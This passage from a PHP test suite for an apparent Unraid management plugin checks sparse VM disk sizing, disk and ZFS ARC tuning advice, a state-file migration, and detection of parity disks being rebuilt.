    exec('truncate -s 3G ' . escapeshellarg("$tmp/testpool/domains/Win_11/vdisk1.img"));
    file_put_contents("$tmp/testpool/domains/Win_11/sub/vdisk2.qcow2", str_repeat('q', 4096));
    file_put_contents("$tmp/testpool/domains/Win_11/Win_11.xml", str_repeat('x', 100));
    symlink("$tmp/testpool/domains/Win_11/vdisk1.img", "$tmp/testpool/domains/Win_11/link.img");
    symlink("$tmp/testpool/domains/Win_11/sub", "$tmp/testpool/domains/Win_11/sublink");
    same('sparse: the apparent size of every regular file under a folder - the sparse vdisk whole, the small ones, never through a link',
        3 * 1073741824 + 4096 + 100, backupApparentSize("$tmp/testpool/domains/Win_11"));
    same('sparse: a folder that isn\'t there, is a link, or holds more entries than a VM\'s folder would - unknown', [null, null, null],
        [backupApparentSize("$tmp/testpool/domains/Gone"), backupApparentSize("$tmp/testpool/domains/Win_11/sublink"), backupApparentSize("$tmp/testpool/domains/Win_11", 3)]);

    file_put_contents("$tmp/disks.ini", "[\"testpool\"]\nname=\"testpool\"\nspundown=\"0\"\n[\"sleepy\"]\nname=\"sleepy\"\nspundown=\"1\"\n");
    $GLOBALS['disksIni'] = "$tmp/disks.ini";
    $s = ['general' => ['dumps_share' => ['UnraidSecretaryOffice']], 'share|domains' => ['mode' => ['snapshot'], 'locations' => ['testpool']],
          'share|sleepyshare' => ['mode' => ['snapshot'], 'locations' => ['sleepy']],
          'vm|Win 11' => ['kopia' => ['yes'], 'folder' => ['domains/Win_11']], 'vm|Both' => ['kopia' => ['yes'], 'folder' => ['domains/Win_11', 'sleepyshare/x']],
          'vm|Nowhere' => ['kopia' => ['yes'], 'folder' => ['domains/Gone']], 'vm|Nofolder' => ['kopia' => ['yes']]];
    same('sparse: a VM source\'s size for the first-upload estimate is what Kopia reads - its disk files whole (a stat, no zfs list)',
        3 * 1073741824 + 4096 + 100, backupSourceSize('vm:Win 11', $s, 'uso-backup-20261007-0100', $tmp));
    same('sparse: a VM with a folder on a sleeping place, a folder that is gone, or no folder at all - unknown, nothing woken', [null, null, null],
        [backupSourceSize('vm:Both', $s, 'uso-backup-20261007-0100', $tmp), backupSourceSize('vm:Nowhere', $s, 'uso-backup-20261007-0100', $tmp),
         backupSourceSize('vm:Nofolder', $s, 'uso-backup-20261007-0100', $tmp)]);
    unset($GLOBALS['disksIni']);

    // Ms. Dustdevil: a disk file's two sizes, and when the gap is worth a word
    $f = waFileSizes("$tmp/testpool/domains/Win_11/vdisk1.img");
    same('sparse: waFileSizes - what the file is and what it takes (a 3 GiB sparse file takes next to nothing); the gap too small for a word', [3 * 1073741824, true, false],
        [$f['bytes'], $f['allocated'] !== null && $f['allocated'] < 10 * 1048576, $f['sparse']]);
    same('sparse: a file that isn\'t there', ['bytes' => null, 'allocated' => null, 'sparse' => false], waFileSizes("$tmp/testpool/domains/Win_11/gone.img"));
    $g = 1000 * 1000 * 1000;
    same('sparse: worth a word - at least 4x what it holds AND at least 200 GB of holes (1.6 TB / 21 GB yes; 1 TB / 300 GB no: only 3.3x; 240 GB / 50 GB: almost 5x but only 190 GB of holes; '
        . '250 GB / 50 GB: exactly 200 GB, yes; 800 GB / 0 yes; unknown sizes never; exactly 4x yes, a hair under no)',
        [true, false, false, true, true, false, false, true, false],
        [waSparseDisk(1600 * $g, 21 * $g), waSparseDisk(1000 * $g, 300 * $g), waSparseDisk(240 * $g, 50 * $g), waSparseDisk(250 * $g, 50 * $g), waSparseDisk(800 * $g, 0),
         waSparseDisk(null, 1), waSparseDisk(1600 * $g, null), waSparseDisk(1000 * $g, 250 * $g), waSparseDisk(999 * $g, 250 * $g)]);

    // her tip and her page, Mr. Backupsy's row: the words are there
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    check('sparse: Ms. Dustdevil\'s tip, with its link into Unraid\'s VMs page, the file line\'s note', str_contains($js, "add('vm_sparse',") && str_contains($js, "T('where.vm.sparse'")
        && isset($en['where.adv.vm_sparse.title']['one'], $en['where.adv.vm_sparse.title']['other'], $en['where.adv.vm_sparse.why'], $en['where.adv.vm_sparse.disk'], $en['where.adv.to_vms'], $en['where.vm.sparse'])
        && str_contains($en['where.adv.vm_sparse.why'], '{example}') && str_contains($en['where.adv.vm_sparse.disk'], '{virtual}') && str_contains($en['where.adv.vm_sparse.disk'], '{used}'));
    $bjs = (string) file_get_contents(OFFICE_DIR . '/public/desks/backup/desk.js');
    $ben = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/backup/lang/en.json'), true) ?: [];
    check('sparse: Mr. Backupsy\'s VM row says what a first upload reads, the start\'s note names the VMs', str_contains($bjs, "T('setup.vm_upload', { size:") && str_contains($bjs, "T('setup.preset.kopia_vms'")
        && str_contains($ben['setup.vm_upload'] ?? '', '{size}') && str_contains($ben['setup.vm_upload_hint'] ?? '', '{used}') && str_contains($ben['setup.preset.kopia_vms']['other'] ?? '', '{list}'));
    hardeningRm($tmp);
}

/**
 * Ms. Dustdevil takes over Ms. Whereabouts' files once (2026-10) — since 1.44 the migration step `where-files`
 * (agent/lib/migrate.php officeMigrateWhere(), up to 1.43 her start): her state (only while the new one isn't there),
 * what du measured (merged — what was measured later wins, never lost), only plain JSON files of the folder; then the
 * old ones are renamed aside (<name>.before-<version>), never deleted, and a second run does nothing.
 */
/**
 * Ms. Dustdevil's two disk tunables (2026-10-09, Settings → Disk Settings): the array's write method — keep
 * read/modify/write when nothing writes straight to the array, turbo write for shares that do (or Squid's plugin) — and
 * ZFS's read cache only where a VM with PCI passthrough could come too late (a large server must stay quiet: 125 GB
 * RAM, 44 GB of running VMs, a 32 GB passthrough VM, ARC «Unlimited (Dynamic)» at RAM − 1 GB).
 */
function testWhereTunables(): void
{
    $disks = fn (bool $parity = true, int $data = 2) => ['parity' => ['name' => 'parity', 'type' => 'Parity', 'device' => $parity ? 'sdb' : ''],
            'parity2' => ['name' => 'parity2', 'type' => 'Parity', 'device' => '']]
        + array_combine(array_map(fn ($i) => "disk$i", range(1, max(1, $data))),
            array_map(fn ($i) => ['name' => "disk$i", 'type' => 'Data', 'device' => $i <= $data ? "sd$i" : ''], range(1, max(1, $data))))
        + ['cache' => ['name' => 'cache', 'type' => 'Cache', 'device' => 'nvme0n1']];
    $share = fn (string $name, string $primary, ?string $secondary = null, bool $missing = false) =>
        ['name' => $name, 'storage' => ['primary' => $primary, 'secondary' => $secondary, 'missing' => $missing]];
    $tower = [$share('appdata', 'cache'), $share('isos', 'array'), $share('media', 'big', 'array'), $share('gone', 'oldpool', null, true)];
    $pooled = [$share('appdata', 'cache'), $share('media', 'big', 'array'), $share('photos', 'big', 'array')];
    $cfg = fn (string $method = 'auto', string $delay = '0', array $own = []) => ['md_write_method' => $method, 'spindownDelay' => $delay] + $own;
    $tip = fn (array $r) => [$r['tip'], $r['method'], $r['direct'], $r['pooled'], $r['sleep'], $r['plugin']];

    same('write method: a test server — «Auto», isos straight onto the array, disks never sleep: turbo (a share of a gone pool doesn\'t count)',
        ['turbo', 'auto', ['isos'], 1, false, null], $tip(waWriteMethod($cfg(), $disks(), $tower, null)));
    same('write method: everything through a pool, disks sleep — keep read/modify/write',
        ['keep', 'auto', [], 2, true, null], $tip(waWriteMethod($cfg('auto', '30'), $disks(), $pooled, null)));
    same('write method: «read/modify/write» chosen by hand is the same', ['keep', 'rmw'], array_slice($tip(waWriteMethod($cfg('0'), $disks(), $pooled, null)), 0, 2));
    same('write method: an odd value is Unraid\'s «Auto», a line with a newline still read', ['auto', 'reconstruct'], [waWriteMethod(['md_write_method' => 'x'], $disks(), $pooled, null)['method'], waWriteMethod($cfg("1\n"), $disks(), $pooled, null)['method']]);
    same('write method: no tip — no parity / one data disk / reconstruct write set / the plugin switching',
        [null, null, null, null],
        [waWriteMethod($cfg(), $disks(false), $tower, null)['tip'], waWriteMethod($cfg(), $disks(true, 1), $tower, null)['tip'],
         waWriteMethod($cfg('1'), $disks(), $tower, null)['tip'], waWriteMethod($cfg(), $disks(), $tower, ['enabled' => 'yes'])['tip']]);
    same('write method: the plugin installed but switched off — the turbo tip, it says so', ['turbo', 'off'],
        [waWriteMethod($cfg('auto', '15'), $disks(), $tower, ['enabled' => 'no'])['tip'], waWriteMethod($cfg(), $disks(), $tower, [])['plugin']]);
    same('write method: disks sleep — a default delay, or one disk\'s own; -1 (the default) and 0 (never) don\'t',
        [true, true, false, false],
        [waWriteMethod($cfg('auto', '45'), $disks(), $pooled, null)['sleep'], waWriteMethod($cfg('auto', '0', ['diskSpindownDelay.2' => '15']), $disks(), $pooled, null)['sleep'],
         waWriteMethod($cfg('auto', '0', ['diskSpindownDelay.1' => '-1', 'diskSpindownDelay.2' => '0']), $disks(), $pooled, null)['sleep'],
         waWriteMethod($cfg('auto', '0', ['diskSpindownDelay.1' => "15\n"]), $disks(), $pooled, null)['sleep']]);
    same('write method: no shares at all — keep (nothing writes straight to the array)', ['keep', 0], [waWriteMethod($cfg(), $disks(), [], null)['tip'], waWriteMethod($cfg(), $disks(), [], null)['pooled']]);

    // ZFS's read cache
    $g = 1073741824;
    $mem = fn (float $gib) => sprintf("MemTotal:       %d kB\nMemFree:          784728 kB\nMemAvailable:    3194332 kB\n", (int) round($gib * 1048576));
    $arc = fn (float $cmax, float $size = 1, float $free = 0.25) => sprintf("13 1 0x01 147 39984 4711 4711\nname                            type data\nhits                            4    1234\n"
        . "size                            4    %d\nc                               4    %d\nc_min                           4    194435584\nc_max                           4    %d\n"
        . "compressed_size                 4    99\narc_sys_free                    4    %d\n", (int) ($size * $g), (int) ($size * $g), (int) ($cmax * $g), (int) ($free * $g));
    $docker = fn (float $gib) => sprintf("anon %d\nfile 123456789\nkernel 3456\nanon_thp 0\n", (int) ($gib * $g));
    $vm = fn (string $name, float $gib, bool $running, int $passthrough = 0) => ['name' => $name, 'memory' => (int) ($gib * $g), 'running' => $running, 'passthrough' => $passthrough];
    $unlimited = "options zfs zfs_arc_max=0\n";

    // a large server (OpenZFS 2.4.4): 125 GB, c_max 124.4 GB, ARC 11 GB, arc_sys_free 4.2 GB, VMs running 44 GB, the Gaming VM 32 GB with passthrough
    $bigVms = [$vm('Windows_11_A', 16, true), $vm('Debian_VM', 12, true), $vm('Lab-Server', 16, true), $vm('Gaming', 32, false, 2)];
    $big = waZfsArc(true, $unlimited, $arc(124.4, 11, 4.2), $mem(125), $docker(10), $bigVms);
    same('zfs arc: a large server — unlimited, the numbers as read, NO tip (44 GB running + 32 GB passthrough of 125 GB is fine)',
        [true, 0, 125 * $g, (int) (124.4 * $g), 11 * $g, (int) (4.2 * $g), 44 * $g, 10 * $g, 124 * $g, null],
        [$big['unlimited'], $big['setting'], $big['ram'], $big['c_max'], $big['size'], $big['sys_free'], $big['vm_running'], $big['containers'], $big['default'], $big['tip']]);
    same('zfs arc: a large server with 25 GB in containers — still no tip', null, waZfsArc(true, $unlimited, $arc(124.4), $mem(125), $docker(25), $bigVms)['tip']);

    // tight: 64 GB, 16 GB running, a 32 GB passthrough VM, 6 GB in containers, 4 GB for Unraid — 6 GB left (< 10 %), the ARC may take 63
    $tightVms = [$vm('Work', 16, true), $vm('Gaming', 32, false, 1)];
    $t = waZfsArc(true, $unlimited, $arc(63), $mem(64), $docker(6), $tightVms);
    same('zfs arc: tight — the passthrough VM named, the others, what is left, a cap of what is left (rounded down)',
        ['passthrough', 'Gaming', 32 * $g, 16 * $g, 6 * $g, 6],
        [$t['tip'], $t['vm'] ?? null, $t['vm_memory'] ?? null, $t['others'] ?? null, $t['left'] ?? null, $t['cap'] ?? null]);
    $running = waZfsArc(true, $unlimited, $arc(63), $mem(64), $docker(6), [$vm('Work', 16, true), $vm('Gaming', 32, true, 1)]);
    same('zfs arc: the passthrough VM running already — its RAM counted once', ['passthrough', 16 * $g, 6], [$running['tip'], $running['others'] ?? null, $running['cap'] ?? null]);
    same('zfs arc: the tightest of two passthrough VMs', 'Big', waZfsArc(true, $unlimited, $arc(63), $mem(64), $docker(6),
        [$vm('Work', 16, true), $vm('Small', 8, false, 1), $vm('Big', 32, false, 1)])['vm'] ?? null);
    same('zfs arc: the ARC capped below what is left — no tip', null, waZfsArc(true, "options zfs zfs_arc_max=4294967296\n", $arc(4), $mem(64), $docker(6), $tightVms)['tip']);
    same('zfs arc: the VMs alone don\'t fit — a tip, a cap of at least 1 GB, nothing left', ['passthrough', 1, -2 * $g],
        array_map(fn ($k) => waZfsArc(true, $unlimited, $arc(31), $mem(32), $docker(6), [$vm('Work', 8, true), $vm('Gaming', 16, false, 1)])[$k] ?? null, ['tip', 'cap', 'left']));
    same('zfs arc: no passthrough VM — no tip, however full (the ARC shrinks for ordinary VMs)', null,
        waZfsArc(true, $unlimited, $arc(7), $mem(8), $docker(3), [$vm('Work', 6, true)])['tip']);
    same('zfs arc: a passthrough VM with plenty of room — no tip', null, waZfsArc(true, $unlimited, $arc(255), $mem(256), $docker(10), $tightVms)['tip']);
    same('zfs arc: no ZFS / no ARC numbers / no RAM — nothing at all', [null, null, null],
        [waZfsArc(false, $unlimited, $arc(63), $mem(64), $docker(6), $tightVms), waZfsArc(true, $unlimited, '', $mem(64), '', $tightVms),
         waZfsArc(true, $unlimited, $arc(63), '', '', $tightVms)]);

    // the setting as Unraid's page reads it (DiskSettings.page: 0 or the whole RAM = «Unlimited (Dynamic)»), OpenZFS's default
    $setting = fn (string $conf, float $ram = 64) => [waZfsArc(true, $conf, $arc(12.8), $mem($ram), '', [])['setting'], waZfsArc(true, $conf, $arc(12.8), $mem($ram), '', [])['unlimited']];
    same('zfs arc: the setting — 0, Unraid\'s 20 %, the whole RAM (OpenZFS ignores it), no line (Unraid writes 20 % at boot), a comment, another option first',
        [[0, true], [13743895347, false], [68719476736, true], [null, false], [null, false], [0, true]],
        [$setting($unlimited), $setting("options zfs zfs_arc_max=13743895347\n"), $setting("options zfs zfs_arc_max=68719476736\n"), $setting(''),
         $setting("# options zfs zfs_arc_max=0\n"), $setting("options zfs zfs_arc_min=1073741824 zfs_arc_max=0\n")]);
    same('zfs arc: OpenZFS 2.4\'s default — the larger of 5/8 of the RAM and RAM − 1 GiB (a test server: 6076112 kB)',
        [124 * $g, (int) (2 * $g * 5 / 8), 6076112 * 1024 - $g],
        [waZfsArc(true, '', $arc(1), $mem(125), '', [])['default'], waZfsArc(true, '', $arc(1), $mem(2), '', [])['default'],
         waZfsArc(true, '', $arc(1), "MemTotal:        6076112 kB\n", '', [])['default']]);
    same('zfs arc: no docker cgroup — containers 0; «anon_thp» is no «anon»', [0, 0], [waZfsArc(true, '', $arc(1), $mem(8), '', [])['containers'],
        waZfsArc(true, '', $arc(1), $mem(8), "anon_thp 4096\nfile 1\n", [])['containers']]);

    $advice = waAdvice([], [], []);
    same('tunables: her advice carries both facts (none for ZFS without a ZFS pool)', [true, null], [array_key_exists('write_method', $advice), $advice['zfs_arc']]);

    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    foreach (['write_method_keep', 'write_method_turbo', 'zfs_arc_passthrough'] as $id) {
        check("tunables: tip $id is hers, links Unraid's Disk Settings", str_contains($js, "add('$id',") && isset($en["where.adv.$id.title"], $en["where.adv.$id.why"]));
    }
    check('tunables: the rows read the agent\'s verdict, never a tunable of their own', str_contains($js, "wm.tip === 'keep'") && str_contains($js, "wm.tip === 'turbo'")
        && str_contains($js, "arc.tip === 'passthrough'") && str_contains($js, "const toDisks = { path: '/Settings/DiskSettings'"));
    check('tunables: her help names both', str_contains($js, "[T('where.help.tunables'), T('where.help.tunables_text')]")
        && str_contains($en['where.help.tunables_text'] ?? '', '⟦Tunable (md_write_method)⟧') && str_contains($en['where.help.tunables_text'] ?? '', '⟦Tunable (zfs_arc_max)⟧'));
    check('tunables: the ZFS tip says how to cap, and the cap is in GB', str_contains($en['where.adv.zfs_arc_passthrough.why'] ?? '', '«⟦Custom value (GB)⟧», e.g. {cap} GB')
        && str_contains($en['where.adv.zfs_arc_passthrough.why'] ?? '', 'zfs_arc_sys_free={sys_free}'));
}

function testWhereTakeOver(): void
{
    $tmp = hardeningTmp('where-takeover');
    $state = ['time' => 100, 'shares' => [['name' => 'appdata']], 'containers' => [], 'scripts' => []];
    file_put_contents("$tmp/whereabouts.json", json_encode($state));
    $oldSizes = json_encode(['sizes' => ['/mnt/user/a' => ['bytes' => 1, 'at' => 100], '/mnt/user/b' => ['bytes' => 2, 'at' => 200]],
        'queue' => ['/mnt/user/q'], 'running' => ['/mnt/user/r']]);
    file_put_contents("$tmp/whereabouts-sizes.json", $oldSizes);
    file_put_contents("$tmp/cleanup-where-sizes.json", json_encode(['sizes' => [
        '/mnt/user/b' => ['bytes' => 22, 'at' => 300], '/mnt/user/c' => ['bytes' => 3, 'at' => 50]], 'queue' => [], 'running' => []]));
    $done = officeMigrateWhere($tmp, '1.44.0');
    same('where takeover: both files, each kept aside', ['whereabouts.json → cleanup-where.json (the old one kept as whereabouts.json.before-1.44.0)',
        'whereabouts-sizes.json → cleanup-where-sizes.json (the old one kept as whereabouts-sizes.json.before-1.44.0)'], $done);
    same('where takeover: the old files are renamed aside, as they were — never deleted', [false, false, json_encode($state), $oldSizes],
        [file_exists("$tmp/whereabouts.json"), file_exists("$tmp/whereabouts-sizes.json"), @file_get_contents("$tmp/whereabouts.json.before-1.44.0"),
         @file_get_contents("$tmp/whereabouts-sizes.json.before-1.44.0")]);
    same('where takeover: her state as it was', $state, json_decode((string) file_get_contents("$tmp/cleanup-where.json"), true));
    $sizes = json_decode((string) file_get_contents("$tmp/cleanup-where-sizes.json"), true);
    same('where takeover: every size kept, the later measurement wins, no old jobs', [1, 22, 3, [], []],
        [$sizes['sizes']['/mnt/user/a']['bytes'] ?? null, $sizes['sizes']['/mnt/user/b']['bytes'] ?? null, $sizes['sizes']['/mnt/user/c']['bytes'] ?? null,
         $sizes['queue'] ?? null, $sizes['running'] ?? null]);
    same('where takeover: once', [], officeMigrateWhere($tmp, '1.44.0'));
    same('where takeover: no temporary files left', [], array_values(array_filter(scandir($tmp) ?: [], fn ($n) => str_ends_with($n, '.tmp'))));

    // a newer state of hers stays; an old one that is a link or no JSON is left alone
    file_put_contents("$tmp/whereabouts.json", json_encode(['time' => 1]));
    officeMigrateWhere($tmp, '1.44.0');
    same('where takeover: her own newer state stays; the second old file aside gets a number', [100, true],
        [json_decode((string) file_get_contents("$tmp/cleanup-where.json"), true)['time'] ?? null, is_file("$tmp/whereabouts.json.before-1.44.0-2")]);
    file_put_contents("$tmp/elsewhere.json", json_encode(['sizes' => ['/x' => ['bytes' => 9, 'at' => 999]]]));
    symlink("$tmp/elsewhere.json", "$tmp/whereabouts-sizes.json");
    same('where takeover: a link is no file of hers', ['whereabouts-sizes.json left alone (no plain file)'], officeMigrateWhere($tmp, '1.44.0'));
    unlink("$tmp/whereabouts-sizes.json");
    file_put_contents("$tmp/whereabouts-sizes.json", 'not json');
    same('where takeover: no JSON — left alone', ['whereabouts-sizes.json left alone (no JSON)'], officeMigrateWhere($tmp, '1.44.0'));
    same('where takeover: nothing from the link went in', false, isset(json_decode((string) file_get_contents("$tmp/cleanup-where-sizes.json"), true)['sizes']['/x']));
    hardeningRm($tmp);
    // her start no longer takes anything over (the step did, once) — and nothing in the agent deletes her old files
    $where = (string) file_get_contents(OFFICE_DIR . '/agent/lib/where.php');
    check('where takeover: a migration step now — not her start, no unlink', !function_exists('whereTakeOver') && !str_contains($where, 'function whereTakeOver')
        && in_array('where-files', array_column(officeMigrateSteps(), 'id'), true)
        && !str_contains((string) file_get_contents(OFFICE_DIR . '/agent/lib/migrate.php'), 'unlink('));
}

/**
 * Ms. Whereabouts is no desk any more: Ms. Dustdevil has her actions, her tick work and her fit (every server — she
 * knows where everything is; without Docker and VMs there's just nothing to sweep up), the page asks for exactly
 * those actions and parts, and no text of the office names Ms. Whereabouts any more.
 */
function testWhereDesk(): void
{
    check('where desk: no desk whereabouts (agent, web)', !isset(desks()['whereabouts']) && !is_dir(OFFICE_DIR . '/public/desks/whereabouts')
        && !is_file(OFFICE_DIR . '/agent/desks/whereabouts.php'));
    $actions = array_keys(desks()['cleanup']['actions'] ?? []);
    same('where desk: Ms. Dustdevil has her actions', [], array_values(array_diff(['where_refresh', 'where_scan', 'where_measure', 'where_sizes'], $actions)));
    $fit = (desks()['cleanup']['fit'])();
    check('where desk: Ms. Dustdevil fits every server', $fit['ok'] === true && in_array($fit['why'], ['yes', 'where'], true));
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js');
    preg_match_all('/\$\{ID\}\.(where_[a-z_]+)`/', $js, $m);
    same('where desk: the page asks only for her actions', [], array_values(array_diff(array_unique($m[1]), $actions)));
    preg_match_all("/part: '([a-z-]+)'/", $js, $m);
    $parts = array_map(fn ($p) => "cleanup-$p.json", array_values(array_unique($m[1])));      // the API's data/<desk>-<part>.json
    sort($parts);
    same('where desk: the parts the page reads are her files', [WHERE_SIZES_FILE, WHERE_FILE], $parts);
    $core = (string) file_get_contents(OFFICE_DIR . '/public/assets/core.js');
    check('where desk: her look and her measuring stay quiet (no spinner)', (bool) preg_match('/const QUIET = .*where_refresh.*where_measure/', $core));
    check('where desk: both parts on her page', str_contains($js, "part(T('part.where')") && str_contains($js, "part(T('part.tidy')"));
    // Docker stopped (QA 2026-10-08 #13): her facts say so instead of «0 of 0 running», and so does Mr. Backupsy
    $sys = waSystem([], [], [], ['running' => false, 'since' => null, 'step' => null]);
    // D-F6 (2026-10-19): while a backup runs her «Where is what» showed the engine's last log line as its step — English on
    // the German page. Now the status file's coded phase as Mr. Backupsy's step in the office's words, or no step at all
    $wd = sys_get_temp_dir() . '/office-tests-where-step-' . getmypid();
    @mkdir("$wd/logs", 0700, true);
    @mkdir("$wd/state", 0700, true);
    file_put_contents("$wd/logs/latest.log", "2026-10-19 21:05:00  Kopia: uploading share appdata (12 GB)\n");
    $stepOf = function (?array $st) use ($wd): ?string {
        $st === null ? @unlink("$wd/state/status.json") : file_put_contents("$wd/state/status.json", json_encode($st));
        return lastLogStep("$wd/logs/latest.log");
    };
    $lang = officeNotifyLang();
    same('where desk: the backup\'s step — the coded phase in his words (offsite, snapshots), never the log line; nothing coded, ended or no status: none',
        [officeNotifyText('backup', 'step.kopia', [], $lang), officeNotifyText('backup', 'step.snapshots', [], $lang), null, null, null, null],
        [$stepOf(['result' => 'running', 'phase' => 'kopia']), $stepOf(['result' => 'running', 'phase' => 'vms']), $stepOf(['result' => 'running', 'phase' => 'Kopia: up']),
         $stepOf(['result' => 'ok', 'phase' => 'done']), $stepOf(['result' => 'running']), $stepOf(null)]);
    check('where desk: the step\'s words exist in German', ($de = langFile(OFFICE_WEB . '/desks/backup/lang/de.json')['step.kopia'] ?? '') !== '' && $de !== 'Offsite');
    exec('rm -rf ' . escapeshellarg($wd));
    check('where desk: whether Docker and the VM service answer', is_bool($sys['docker']['up'] ?? null) && is_bool($sys['vms']['up'] ?? null));
    check('where desk: Docker off said on her page', substr_count($js, "docker.up === false ? Office.t('common.docker_off')") >= 1
        && str_contains($js, "if (s.system.docker.up === false) return { sub: Office.t('common.docker_off') }"));
    $bk = (string) file_get_contents(OFFICE_DIR . '/public/desks/backup/desk.js');
    check('backup: Docker off said on his overview', str_contains($bk, "c.up === false") && str_contains($bk, "Office.t('common.docker_off')"));

    // her look is kept fresh by the API (apiPart(): the server's clock, the short wait), not by the page's clock:
    // desk.json names the part and its action (officeDeskParts()), the page only reads the part — no Date.now()
    // against the look's time, no where_refresh of its own that the normal action path would park for minutes
    require_once OFFICE_DIR . '/src/desks.php';
    $meta = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.json'), true);
    same('where desk: the API keeps her look fresh (desk.json parts)', ['where' => ['refresh_after' => 600, 'action' => 'where_refresh']], officeDeskParts($meta['parts'] ?? null));
    same('where desk: only well-formed part rules count', ['ok' => ['refresh_after' => 5, 'action' => 'look']],
        officeDeskParts(['ok' => ['refresh_after' => 5, 'action' => 'look'], 'Bad' => ['refresh_after' => 5, 'action' => 'look'], 'x' => ['refresh_after' => '5', 'action' => 'look'],
                         'y' => ['refresh_after' => 0, 'action' => 'look'], 'z' => ['refresh_after' => 5, 'action' => 'a.b'], 'w' => 'look', 7 => ['refresh_after' => 5, 'action' => 'look']]));
    same('where desk: … and none without any', [[], []], [officeDeskParts(null), officeDeskParts('where')]);
    check('where desk: the page reads her look through Office.loadState() (fresh when asked), never by its own clock',
        str_contains($js, "Office.loadState(ID, { part: 'where', fresh }") && !preg_match('/Date\.now\(\)[^\n]*state\.time/', $js) && !str_contains($js, '.where_refresh`'));
    $api = (string) file_get_contents(OFFICE_DIR . '/src/api.php');
    check('where desk: the API looks with the action desk.json names (apiLook(), the short wait), hired desks only',
        str_contains($api, "apiLook(\$file, \"\$desk.{\$rule['action']}\", \$rule['refresh_after'], \"\$desk.\$part\", \$look)")
        && str_contains($api, "if (\$rule === null || !officeIsHired(\$desk)) {") && str_contains($api, 'askAgent($action, [], 10)'));

    // links to her page name the part they mean (her rooms are «Tidying up», far below «Where is what»)
    $links = [];
    foreach (array_merge(glob(OFFICE_DIR . '/agent/desks/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: [], glob(OFFICE_DIR . '/src/*.php') ?: [],
                         glob(OFFICE_DIR . '/public/assets/*.js') ?: [], glob(OFFICE_DIR . '/public/desks/*/desk.js') ?: []) as $f) {
        preg_match_all("~#/cleanup(?:/([a-z]*))?(?=['\"`])~", (string) file_get_contents($f), $m);
        foreach ($m[1] as $part) {
            if (!in_array($part, ['where', 'tidy'], true)) {
                $links[] = basename($f) . ": #/cleanup" . ($part !== '' ? "/$part" : '');
            }
        }
    }
    same('where desk: every link to her page names its part (where, tidy)', [], $links);
    $care = (string) file_get_contents(OFFICE_DIR . '/agent/desks/caretaker.php');
    check('where desk: the team lead\'s icon_loop leads to her rooms', str_contains($care, "? '#/cleanup/tidy' : 'docker'"));

    // nobody names her any more: the office's and every desk's texts, the Dashboard tile
    $names = '/Whereabouts|Wasistwo|Dovè|Saitout|Dondestá/u';
    $files = array_merge(glob(OFFICE_DIR . '/public/lang/*.json') ?: [], glob(OFFICE_DIR . '/public/desks/*/lang/*.json') ?: [], [OFFICE_DIR . '/src/dashboard.php']);
    $named = array_values(array_filter($files, fn ($f) => preg_match($names, (string) file_get_contents($f)) === 1));
    same('where desk: no text names Ms. Whereabouts any more', [], array_map(fn ($f) => substr($f, strlen(OFFICE_DIR) + 1), $named));
}

/**
 * A parity disk being built is not «DISK_INVALID» (2026-10-08; a large server's first parity build): waBuilding() from a
 * crafted var.ini + disks.ini — building parity → the parity disk is `building` (what, percent, the time to go), the data
 * disks and pools not; invalid without a resync → nothing (the page counts it as bad); a data disk's rebuild; a check
 * marks nobody; a clear marks the new disk; paused. The page: the chip takes the place of the red status, the bad count
 * leaves a building disk out, every text in English.
 */
function testWhereBuilding(): void
{
    $tmp = hardeningTmp('where-building');
    $disk = fn (string $name, string $type, string $status, string $dev = 'sdx') => "[\"$name\"]\nname=\"$name\"\ndevice=\"$dev\"\ntype=\"$type\"\nstatus=\"$status\"\nspundown=\"0\"\n";
    $disks = $disk('parity', 'Parity', 'DISK_INVALID', 'sdo') . $disk('disk1', 'Data', 'DISK_OK', 'sda') . $disk('disk2', 'Data', 'DISK_OK', 'sdb')
        . $disk('parity2', 'Parity', 'DISK_NP_DSBL', '') . $disk('hazel', 'Cache', 'DISK_OK', 'nvme0n1') . $disk('flash', 'Flash', 'DISK_OK', 'sdz');
    // a large server on 2026-10-08, 81.6 % through its first parity build
    $var = fn (array $o) => implode("\n", array_map(fn ($k, $v) => "$k=\"$v\"", array_keys($o), $o)) . "\n";
    $homeserver = ['mdState' => 'STARTED', 'mdResync' => '23437770700', 'mdResyncPos' => '19114247308', 'mdResyncDb' => '462168', 'mdResyncDt' => '31',
        'mdResyncAction' => 'recon P', 'mdResyncSize' => '23437770700', 'mdNumInvalid' => '2'];
    file_put_contents("$tmp/var.ini", $var($homeserver));
    file_put_contents("$tmp/disks.ini", $disks);
    $b = waBuilding(readCfg("$tmp/var.ini"), readCfg("$tmp/disks.ini", true));
    same('where building: a parity build - the parity disk is being built, nobody else (the missing parity2, the data disks, a pool, the flash)',
        ['parity'], array_keys($b));
    same('where building: what, how far, not paused', ['parity', 81.6, false], [$b['parity']['what'], $b['parity']['percent'], $b['parity']['paused']]);
    $eta = (int) round(31 * ((23437770700 - 19114247308) / (462168 / 100 + 1)) / 100);        // Unraid's statuscheck
    same('where building: the time to go as Unraid reckons it', $eta, $b['parity']['eta']);
    check('where building: … a plausible number of seconds', $eta > 3600 && $eta < 14 * 86400, (string) $eta);
    // the same disks.ini without a resync: DISK_INVALID is a real problem - nothing is «building»
    same('where building: invalid without a resync - nothing (the page counts the disk as bad)', [],
        waBuilding(readCfg('/dev/null') + ['mdResyncPos' => '0', 'mdResyncAction' => 'check P', 'mdResync' => '0'], readCfg("$tmp/disks.ini", true)));
    same('where building: a parity check reads every disk and marks none (the array\'s summary says it)', [],
        waBuilding(['mdResyncPos' => '1000', 'mdResyncAction' => 'check P', 'mdResyncSize' => '2000'], readCfg("$tmp/disks.ini", true)));
    // a data disk rebuilt: Unraid names it in the action and calls it invalid meanwhile; the parity disk is fine
    file_put_contents("$tmp/disks.ini", $disk('parity', 'Parity', 'DISK_OK', 'sdo') . $disk('disk1', 'Data', 'DISK_OK', 'sda') . $disk('disk2', 'Data', 'DISK_INVALID', 'sdb')
        . $disk('hazel', 'Cache', 'DISK_OK', 'nvme0n1'));
